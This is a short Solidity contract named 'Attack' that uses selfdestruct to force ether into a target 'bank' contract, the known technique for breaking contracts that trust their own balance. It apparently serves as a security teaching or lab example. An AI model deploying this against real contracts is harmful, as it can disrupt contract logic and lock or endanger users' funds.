// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Attack {
    address bankAddress;

    constructor(address _bankAddress) {
        bankAddress = _bankAddress;
    }

    function spoiler() public payable {
        selfdestruct(payable(bankAddress));
    }
}